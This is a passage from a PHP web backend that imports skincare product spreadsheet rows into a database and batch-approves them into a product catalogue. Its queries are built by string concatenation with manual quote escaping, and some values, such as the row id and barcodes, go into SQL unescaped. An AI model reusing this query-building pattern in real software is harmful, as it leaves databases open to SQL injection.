            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==18){
            $DataKey.=",saleprice_ec";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==19){
            $DataKey.=",gender_female";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==20){
            $DataKey.=",gender_male";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==21){
            $DataKey.=",skintype_normal";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==22){
            $DataKey.=",skintype_dry";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==23){
            $DataKey.=",skintype_oily";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==24){
            $DataKey.=",skintype_combination";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==25){
            $DataKey.=",skintype_sensitive";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==26){
            $DataKey.=",apparea_face";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==27){
            $DataKey.=",apparea_lips";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==28){
            $DataKey.=",apparea_eyes";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==29){
            $DataKey.=",apparea_nose";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==30){
            $DataKey.=",apparea_neck";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==31){
            $DataKey.=",apparea_decollete";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==32){
            $DataKey.=",apparea_tzone";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==33){
            $DataKey.=",timeuse_daytime";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==34){
            $DataKey.=",timeuse_nighttime";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
            if(!empty($data[$x][$y-1])&&!empty($data[$x][$y])){
              $DataKey.=",timeuse_anytime";
              $DataVal.=",N'V'";
            }
          }
          else if($y==35){
            $DataKey.=",byconcern_redness";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==36){
            $DataKey.=",byconcern_repair";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==37){
            $DataKey.=",byconcern_acne";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==38){
            $DataKey.=",byconcern_antipollution";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==39){
            $DataKey.=",byconcern_antiallergenic";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==40){
            $DataKey.=",byconcern_antiinflammation";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==41){
            $DataKey.=",byconcern_darkspot";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==42){
            $DataKey.=",byconcern_darkcircle";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==43){
            $DataKey.=",byconcern_acnemarks";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==44){
            $DataKey.=",byconcern_oilcontrol";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==45){
            $DataKey.=",byconcern_pores";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==46){
            $DataKey.=",byconcern_firming";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==47){
            //blank
          }
          else if($y==48){
            $DataKey.=",byconcern_finelinesandwrinkles";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==49){
            $DataKey.=",byconcern_agingskin";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==50){
            $DataKey.=",byconcern_antifreeradical";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==51){
            $DataKey.=",byconcern_antiir";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==52){
            $DataKey.=",byconcern_protect";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==53){
            $DataKey.=",byconcern_sunprevention";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==54){
            $DataKey.=",byconcern_defense";//!
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==55){
            $DataKey.=",byconcern_brightness";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==56){
            $DataKey.=",byconcern_unevenskintone";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==57){
            $DataKey.=",byconcern_purify";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==58){
            $DataKey.=",byconcern_dehydration";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==59){
            $DataKey.=",byconcern_sundamage";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==60){
            $DataKey.=",byconcern_eczema";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==61){
            $DataKey.=",byconcern_puffiness";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==62){
            $DataKey.=",byconcern_promoterecycling";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==63){
            $DataKey.=",byconcern_exfoliators";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==64){
            $DataKey.=",byconcern_unevenskintexture";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==65){
            $DataKey.=",byconcern_purification";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==66){
            $DataKey.=",byconcern_clean";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==67){
            $DataKey.=",byconcern_atopicdermatitis";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==68){
            $DataKey.=",byconcern_detoxify";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==69){
            $DataKey.=",byconcern_soothe";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==70){
            $DataKey.=",textures_foam";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==71){
            $DataKey.=",textures_fluid";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==72){
            $DataKey.=",textures_serum";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==73){
            $DataKey.=",textures_lotion";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==74){
            $DataKey.=",textures_gel";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==75){
            $DataKey.=",textures_beads";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==76){
            $DataKey.=",textures_cream";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==77){
            $DataKey.=",textures_balm";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==78){
            $DataKey.=",textures_oil";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==79){
            $DataKey.=",textures_bar";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==80){
            $DataKey.=",texture_clay";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==81){
            $DataKey.=",textures_spray";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==82){
            $DataKey.=",textures_padwipe";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==83){
            $DataKey.=",texture_powder";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==84){
            $DataKey.=",textures_capsule";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==85){
            $DataKey.=",pref_alcoholfree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==86){
            $DataKey.=",pref_fragrancefree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==87){
            $DataKey.=",pref_sulfatefree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==88){
            $DataKey.=",pref_oilfree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==89){
            $DataKey.=",pref_siliconeoilfree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==90){
            $DataKey.=",pref_colouringfree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==91){
            $DataKey.=",pref_parabenfree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==92){
            $DataKey.=",pref_mcifree";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==93){
            $DataKey.=",pref_nopreservatives";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==94){
            $DataKey.=",pref_noanimaltest";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==95){
            $DataKey.=",pref_noanimalmaterials";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==96){
            $DataKey.=",pref_organicapproved";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==97){
            $DataKey.=",pref_organicapprovedmaterials";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==98){
            $DataKey.=",pref_organic";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==99){
            $DataKey.=",pref_naturalproduct";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==100){
            $DataKey.=",pref_naturalproductmaterials";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==101){
            $DataKey.=",pref_natural";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==102){
            $DataKey.=",pref_herbs";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==103){
            $DataKey.=",pref_mildandnoirritation";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==104){
            $DataKey.=",pref_antistress";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==105){
            $DataKey.=",ingredients";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==106){
            $DataKey.=",instruction";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==107){
            $DataKey.=",features";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==108){
            $DataKey.=",prodlink_ec";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==109){
            $DataKey.=",countryprodsell";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          else if($y==110){
            $DataKey.=",manufacturedloc";
            $DataVal.=",N'".str_replace("’","''",str_replace("'","''", $data[$x][$y]))."'";
          }
          
          
       }
        $DataKey.=",approval";
        $DataVal.=",'0'";
         //  $query1="Select * from Raw_SCP_2 where sn='".$snname."' AND photos_pic='".$plink."'";
         // //  //echo $checkifexist;
         //   $stmtRaw_SCP_2 = $dbRemote->prepare($query1);
         //   $stmtRaw_SCP_2->execute();
         //  if($stmtRaw_SCP_2->rowCount() == -1) {
         //   echo "duplicate ".$snname."</br>";
         //  }else{
            $query="INSERT INTO Raw_SCP_2 ($DataKey)VALUES($DataVal)";
          
            $stmt = $dbRemote->prepare($query);

            if($stmt->execute()) {
              echo " Success ".$snname."</br>";
            }else{
              echo  " Failed ".$snname."</br>";
            }
          // }
        $DataKey="";
        $DataVal="";
        
          
         // }
        
        
        
       }
    }
    
        
    };

      
  
});

//Excel History
$app->get('/gethistoryfile/', function ($request, $response, $args) {
    
  $stack[] = $var;
  $path    = "/var/www/Reports";
  $files = glob("/var/www/Reports/*.hst", GLOB_BRACE);
  
      for ($y = 0; $y <= count($files); $y++){
        $xmlFile = pathinfo($files[$y]);   
        if(!empty(filePathParts($xmlFile)))
        array_push($stack,filePathParts($xmlFile));

      }
      echo json_encode($stack);
      
  
});

//count all Raw_SCP_2 for notification /csvNotification/
$app->post('/csvNotification/', function ($request, $response, $args) {
    
  $dbRemote = $this->db_remote; 
  try {
    $sql = "Select * FROM Raw_SCP_2 where approval = 0";
    //***Get SCP data from local DB
    $stmt = $dbRemote->query($sql);  
    $importProdData = $stmt->fetchAll(PDO::FETCH_ASSOC);
    echo count($importProdData);  
  } catch (PDOException $pdo) {
    echo "0";
  }
    

  
});

//save all  raw_scp_2 with zero approval to skincareproduct
$app->post('/uploadAll/', function ($request, $response, $args) {
  //database Connection
  $dbRemote = $this->db_remote; 
  $dbLocal = $this->db_local;
  $scpidhasduplicate="";
  $toSCPBatch = $request->getParsedBody();
  $ids = $toSCPBatch['ids'];
  
  $stmtprepare = $dbRemote->prepare("Select * FROM Raw_SCP_2 where approval = 0");

  
  //Check whether the query was successful or not
  if($stmtprepare->execute()) {
    $ids = $stmtprepare->fetchAll();
    
  }
  
  $succCount = 0;
  foreach($ids as $idVal){
    //echo $idVal;
    //**LOOPING SYTEM START
        $id = $idVal['id'];
        $sql = "Select * FROM Raw_SCP_2 where id = $id AND approval = 0";
        
          //***Get SCP data from local DB
          $stmt = $dbRemote->query($sql);  
          $importProdData = $stmt->fetchAll(PDO::FETCH_ASSOC);
          $countRow = count($importProdData);
          
          //echo $countRow;
          //$dbLocal = null;
           
          //Define an Array
          $importedSCPArray = array();
          $formattedSCPArray = array();
          $depSCPArray = array();
          $prodTextureArray = array();
          $byConcernArray = array();
          $appAreaArray = array();
          $skinTypeArray = array();
          $genderArray = array();
          $prefArray = array();
          $linkWeb = array();
          $linkCosmeDe = array();
          $linkCosmeAmer = array();
          $bySize = array();
          $timeToUse = array();
          $barcodeListArr = array();
          $linkEC = array();
          
          
          $importedSCPArray['SCP'] = $importProdData;
          //echo json_encode($importedSCPArray);
          //print_r($importedSCPArray);
          //****************************************************** First Reformatted Array ************************************************
          if($countRow != 0){
            foreach($importedSCPArray['SCP'] as $key => $value){
              //print_r($value);
               //$key = $value['id'];
               
              if (!isset($formattedSCPArray[$key])) $formattedSCPArray[$key] = array();
              

               $formattedSCPArray[$key]['product_type_name'] = $value['prodtype'];    //FK
               $formattedSCPArray[$key]['product_categories_name'] = $value['prodcat'];    //FK
               $formattedSCPArray[$key]['productlink_website'] = $value['productlink_website']; //Unique Key for Duplicate
               $priceTypeWeb = preg_replace("!\d+\.*\d*!","",$value['salesprize_website']);
               $getPriceWeb = preg_replace("/[^0-9.]/","",$value['salesprize_website']);
               $formattedSCPArray[$key]['price_type'] = $priceTypeWeb;
               $formattedSCPArray[$key]['price_web'] = $getPriceWeb;
               
               //**barcodeList array
               $barcodeListArr[$key]['UPC-A'] = $value['barcode_upca'];
               $barcodeListArr[$key]['EAN-13'] = $value['barcode_ean13'];
               $barcodeListArr[$key]['UPC'] = $value['barcode_upc'];
               $barcodeListArr[$key]['GTIN'] = $value['barcode_gtin'];
               $barcodeListArr[$key]['GTIN-14'] = $value['barcode_gtin_14'];
               
               $formattedSCPArray[$key]['barcode'] =  $barcodeListArr;
               
               
               //**gender array
               $genderArray[$key]['female'] = $value['gender_female'];
               $genderArray[$key]['male'] = $value['gender_male'];
               
               $formattedSCPArray[$key]['gender'] =  $genderArray;
               
               
               //**skin type array
               $skinTypeArray[$key]['Normal'] = $value['skintype_normal'];
               $skinTypeArray[$key]['Dry'] = $value['skintype_dry'];
               $skinTypeArray[$key]['Oily'] = $value['skintype_oily'];
               $skinTypeArray[$key]['Combination'] = $value['skintype_combination'];
               $skinTypeArray[$key]['Sensitive'] = $value['skintype_sensitive'];
               
               $formattedSCPArray[$key]['skinType'] =  $skinTypeArray;
               
               //**applied area
               $appAreaArray[$key]['Face'] = $value['apparea_face'];
               $appAreaArray[$key]['Lips'] = $value['apparea_lips'];
               $appAreaArray[$key]['Eyes'] = $value['apparea_eyes'];
               $appAreaArray[$key]['Nose'] = $value['apparea_nose'];
               $appAreaArray[$key]['Neck'] = $value['apparea_neck'];
               $appAreaArray[$key]['Decollete'] = $value['apparea_decollete'];
               $appAreaArray[$key]['T-Zone'] = $value['apparea_tzone'];
               
               $formattedSCPArray[$key]['appArea'] =  $appAreaArray;
                
               //**By Concern Array
               $byConcernArray[$key]['Redness'] = $value['byconcern_redness'];
               $byConcernArray[$key]['Repair'] = $value['byconcern_repair'];
               $byConcernArray[$key]['Acne'] = $value['byconcern_acne'];
               $byConcernArray[$key]['Anti Pollution'] = $value['byconcern_antipollution']; //new entry
               $byConcernArray[$key]['Anti Allergenic'] = $value['byconcern_antiallergenic']; //new entry
               $byConcernArray[$key]['Dark Spots'] = $value['byconcern_darkspot'];
               $byConcernArray[$key]['Dark Circles'] = $value['byconcern_darkcircle'];
               $byConcernArray[$key]['Acne Marks'] = $value['byconcern_acnemarks']; //new entry
               $byConcernArray[$key]['Oil Control'] = $value['byconcern_oilcontrol'];
               $byConcernArray[$key]['Pores'] = $value['byconcern_pores'];
               $byConcernArray[$key]['Firming'] = $value['byconcern_firming']; 
               $byConcernArray[$key]['Fine Lines & Wrinkles'] = $value['byconcern_finelinesandwrinkles'];
               $byConcernArray[$key]['Aging Skin'] = $value['byconcern_agingskin'];
               $byConcernArray[$key]['Anti Free Radical'] = $value['byconcern_antifreeradical']; //new entry
               $byConcernArray[$key]['Anti IR'] = $value['byconcern_antiir']; //new entry
               $byConcernArray[$key]['Protect From UV'] = $value['byconcern_protect']; //new entry
               $byConcernArray[$key]['Defence From UV'] = $value['byconcern_defense']; //new entry
               $byConcernArray[$key]['Uneven Skin Tone'] = $value['byconcern_unevenskintone']; 
               $byConcernArray[$key]['Brighteness'] = $value['byconcern_brightness'];
               $byConcernArray[$key]['Purify'] = $value['byconcern_purify']; //new entry
               $byConcernArray[$key]['Dehydration'] = $value['byconcern_dehydration'];
               $byConcernArray[$key]['Sun Damage'] = $value['byconcern_sundamage'];
               $byConcernArray[$key]['Eczema'] = $value['byconcern_eczema'];
               $byConcernArray[$key]['Puffiness'] = $value['byconcern_puffiness'];
               $byConcernArray[$key]['Promote Circulation'] = $value['byconcern_promoterecycling']; //new entry
               $byConcernArray[$key]['Uneven Skin Texture'] = $value['byconcern_unevenskintexture'];
               $byConcernArray[$key]['Sun Prevention'] = $value['byconcern_sunprevention'];
               $byConcernArray[$key]['Exfoliators'] = $value['byconcern_exfoliators'];
               $byConcernArray[$key]['Purification'] = $value['byconcern_purification']; //new entry
               $byConcernArray[$key]['Cleaning'] = $value['byconcern_clean']; //new entry
               $byConcernArray[$key]['Atopic Dermatitis'] = $value['byconcern_atopicdermatitis']; //new entrys
               $byConcernArray[$key]['Detoxify'] = $value['byconcern_detoxify']; //new entry
               $byConcernArray[$key]['Soothe'] = $value['byconcern_soothe']; //new entry
               
               $formattedSCPArray[$key]['byConcern'] =  $byConcernArray;
               //echo $value['gender_female'];
               //echo json_encode($value['prodtype']);
               
               //**Product Texture Array
               $prodTextureArray[$key]['Foam'] = $value['textures_foam'];
               $prodTextureArray[$key]['Fluid'] = $value['textures_fluid'];
               $prodTextureArray[$key]['Serum'] = $value['textures_serum'];
               $prodTextureArray[$key]['Lotion'] = $value['textures_lotion'];
               $prodTextureArray[$key]['Gel'] = $value['textures_gel'];
               $prodTextureArray[$key]['Beads'] = $value['textures_beads'];
               $prodTextureArray[$key]['Cream'] = $value['textures_cream'];
               $prodTextureArray[$key]['Balm'] = $value['textures_balm'];
               $prodTextureArray[$key]['Oil'] = $value['textures_oil'];
               $prodTextureArray[$key]['Bar'] = $value['textures_bar'];
               $prodTextureArray[$key]['Clay'] = $value['texture_clay'];
               $prodTextureArray[$key]['Spray'] = $value['textures_spray'];
               $prodTextureArray[$key]['Pad/Vipe'] = $value['textures_padwipe'];
               $prodTextureArray[$key]['Powder'] = $value['texture_powder'];
               $prodTextureArray[$key]['Capsule'] = $value['textures_capsule'];
               
               $formattedSCPArray[$key]['textures'] =  $prodTextureArray;
               
               //**preferrence array
               $prefArray[$key]['Alcohol-Free'] = $value['pref_alcoholfree'];
               $prefArray[$key]['Fragrance-Free'] = $value['pref_fragrancefree'];
               $prefArray[$key]['Sulfate-Free'] = $value['pref_sulfatefree'];
               $prefArray[$key]['Silicone-Oil-Free'] = $value['pref_siliconeoilfree']; //new entry
               $prefArray[$key]['Colouring-Free'] = $value['pref_colouringfree']; //new entry
               $prefArray[$key]['Paraben-Free'] = $value['pref_parabenfree'];
               $prefArray[$key]['Oil-Free'] = $value['pref_oilfree'];
               $prefArray[$key]['MC/MCI-Free'] = $value['pref_mcifree']; //new entry
               $prefArray[$key]['No Preservative'] = $value['pref_nopreservatives']; //new entry
               $prefArray[$key]['No Animal Test'] = $value['pref_noanimaltest']; //new entry
               $prefArray[$key]['No Animal Contain Material'] = $value['pref_noanimalmaterials']; //new entry
               $prefArray[$key]['Oraganic Product'] = $value['pref_organicapproved']; //new entry
               $prefArray[$key]['Organic Product Material'] = $value['pref_organicapprovedmaterials']; //new entry
               $prefArray[$key]['Organic'] = $value['pref_organic']; //new entry
               $prefArray[$key]['Natural Product'] = $value['pref_naturalproduct']; //new entry
               $prefArray[$key]['Natural Product Material'] = $value['pref_naturalproductmaterials']; //new entry
               $prefArray[$key]['Natural'] = $value['pref_natural']; //new entry
               $prefArray[$key]['Herbs'] = $value['pref_herbs']; //new entry
               $prefArray[$key]['Mild and No Irritation'] = $value['pref_mildandnoirritation']; //new entry
               $prefArray[$key]['Anti Stress'] = $value['pref_antistress']; //new entry
                  
               
               $formattedSCPArray[$key]['preference'] =  $prefArray;
               
               //**product size
               $oz = preg_replace("/[^0-9.]/","",$value['size_oz']);
               $ml = preg_replace("/[^0-9.]/","",$value['size_ml']);
               $gm = preg_replace("/[^0-9.]/","",$value['size_g']);
               $pcs = preg_replace("/[^0-9.]/","",$value['size_ea']);
               
               $bySize[$key]['oz'] = $oz;
               $bySize[$key]['ml'] = $ml;
               $bySize[$key]['gm'] = $gm;
               $bySize[$key]['pcs'] = $pcs;
               
               $formattedSCPArray[$key]['prodSize'] =  $bySize;
               
               //**Time to Use
               $timeToUse[$key]['dayTime'] = $value['timeuse_daytime'];
               $timeToUse[$key]['nightTime'] = $value['timeuse_nighttime'];
               
               $formattedSCPArray[$key]['timeToUse'] =  $timeToUse;
               
               //**sales price
               
               //price web
               if($value['productlink_website'] || $value['salesprize_website'] != ""){
               $priceTypeWeb = preg_replace("!\d+\.*\d*!","",$value['salesprize_website']);
               $getPriceWeb = preg_replace("/[^0-9.]/","",$value['salesprize_website']);
               //$getPriceWeb = preg_match('/([0-9]+\.[0-9]+)/', $value['salesPrize_website'], $matches);
               //$priceWeb = $matches[1];
               
               $linkWeb[$key]['link'] = $value['productlink_website'];
               $linkWeb[$key]['priceType'] =  $priceTypeWeb;
               $linkWeb[$key]['price'] =  $getPriceWeb;
               $linkWeb[$key]['linkType'] =  "0";
               };
               
               //price EC AMAZON
               if($value['prodlink_ec'] || $value['saleprice_ec'] != ""){
               $priceTypeEC = preg_replace("!\d+\.*\d*!","",$value['saleprice_ec']);
               $getPriceEC = preg_replace("/[^0-9.]/","",$value['saleprice_ec']);
               
               $linkEC[$key]['link'] = $value['prodlink_ec'];
               $linkEC[$key]['priceType'] =  $priceTypeEC;
               $linkEC[$key]['price'] =  $getPriceEC;
               $linkEC[$key]['linkType'] =  "3";
               };
               //price cosmetic de
               if($value['productlink_cosmede'] || $value['salesprice_cosmede'] != ""){
               $priceTypeDe = preg_replace("!\d+\.*\d*!","",$value['salesprice_cosmede']);
               $getPriceDe = preg_replace("/[^0-9.]/","",$value['salesprice_cosmede']);
               
               $linkCosmeDe[$key]['link'] = $value['productlink_cosmede'];
               $linkCosmeDe[$key]['priceType'] =  $priceTypeDe;
               $linkCosmeDe[$key]['price'] =  $getPriceDe;
               $linkCosmeDe[$key]['linkType'] =  "1";
               };
               //price america
               if($value['productlink_cosmeamerica'] || $value['salesprice_cosmeamerica'] != ""){
               $priceTypeAm = preg_replace("!\d+\.*\d*!","",$value['salesprice_cosmeamerica']);
               $getPriceAm = preg_replace("/[^0-9.]/","",$value['salesprice_cosmeamerica']);
               
               $linkCosmeAmer[$key]['link'] = $value['productlink_cosmeamerica'];
               $linkCosmeAmer[$key]['priceType'] =  $priceTypeAm;
               $linkCosmeAmer[$key]['price'] =  $getPriceAm;
               $linkCosmeAmer[$key]['linkType'] =  "2";
               }; 
                   


               $formattedSCPArray[$key]['prodLink'] =  array_merge($linkWeb,$linkCosmeDe,$linkCosmeAmer,$linkEC);
              

            }
            
            $depSCPArray['SCP_dep'] = $formattedSCPArray;
            //echo json_encode($depSCPArray['SCP_dep'][0]['productlink_website']);
            //echo json_encode($depSCPArray); 
            //print_r($depSCPArray);
            
            //****************************************************** Foreign Data Array / one to many relationship ************************************************
            
            //***Avoid Duplicate
            //error_reporting(E_ALL|E_STRICT); 
            //ini_set('display_errors', true); 
            $webLinkDup = $depSCPArray['SCP_dep'][0]['productlink_website'];
            $priceWebDup = $depSCPArray['SCP_dep'][0]['price_web'];
            $priceTypeWebDup = $depSCPArray['SCP_dep'][0]['price_type'];
            $brandDup = str_replace("’","''",str_replace("'","''",$importedSCPArray['SCP'][0]['brandname']));
            $prodNameDup = str_replace("’","''",str_replace("'","''",$importedSCPArray['SCP'][0]['prodname_maintitle']));
            $prodName2Dup = str_replace("’","''",str_replace("'","''",$importedSCPArray['SCP'][0]['prodname_deputyname']));
            $sizeOzDup = $depSCPArray['SCP_dep'][0]['prodSize'][0]['oz'];
            $sizeMlDup = $depSCPArray['SCP_dep'][0]['prodSize'][0]['ml'];
            $sizeGmDup = $depSCPArray['SCP_dep'][0]['prodSize'][0]['gm'];
            $sizePcsDup = $depSCPArray['SCP_dep'][0]['prodSize'][0]['pcs'];
            $barUpcaDup = $depSCPArray['SCP_dep'][0]['barcode'][0]['UPC-A'];
            $barean13Dup = $depSCPArray['SCP_dep'][0]['barcode'][0]['EAN-13'];
            $barUpcDup = $depSCPArray['SCP_dep'][0]['barcode'][0]['UPC'];
            $barGtinDup = $depSCPArray['SCP_dep'][0]['barcode'][0]['GTIN'];;
            $barGtin14Dup = $depSCPArray['SCP_dep'][0]['barcode'][0]['GTIN-14'];
            
            $barcodeEAN13="";
            $barcodeGTIN="";
            $barcodeGTIN14="";
            $barcodeUPC="";
            $barcodeUPCA="";
            $counterbarcode=0;
            if(!empty($barean13Dup)){
              if($counterbarcode==0){
                $barcodeEAN13=" barcode = '$barean13Dup'";
                $counterbarcode=1;
              }
              else
                $barcodeEAN13=" OR barcode = '$barean13Dup'";
            }else{
              $barcodeEAN13="";
            }
            if(!empty($barGtinDup)){
              if($counterbarcode==0){
                $barcodeGTIN=" barcode = '$barGtinDup'";
                $counterbarcode=1;
              }else{
